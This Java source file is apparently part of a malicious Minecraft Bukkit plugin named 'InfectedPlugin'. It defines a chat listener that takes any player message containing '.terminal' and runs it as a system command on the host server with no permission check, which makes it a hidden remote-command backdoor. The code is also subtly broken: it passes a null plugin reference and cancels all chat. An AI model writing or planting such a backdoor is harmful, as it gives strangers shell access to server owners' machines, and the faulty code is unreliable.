 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.CreeperCoders.InfectedPlugin.IP_RunSystemCommand;
 import org.CreeperCoders.InfectedPlugin.InfectedPlugin;
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_terminal implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
        InfectedPlugin plugin = null;
         String message = event.getMessage();
         String[] args = message.split(" ");
         final Player p = event.getPlayer();
         Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".terminal"))
         {
             String command;
             try
             {
                 StringBuilder command_bldr = new StringBuilder();
                 for (int i = 0; i < args.length; i++)
                 {
                     command_bldr.append(args[i]).append(" ");
                 }
                 command = command_bldr.toString().trim();
             }
             catch (Throwable ex)
             {
                 p.sendMessage(ChatColor.GRAY + "Error building command: " + ex.getMessage());
                 return;
             }
             
             p.sendMessage("Running system command: " + command);
             server.getScheduler().runTaskAsynchronously(plugin, new IP_RunSystemCommand(command, plugin));
             cancel = true;
             return;
         }
         
         if (cancel)
         {
             event.setCancelled(true);
             return;
         }
     }
 }
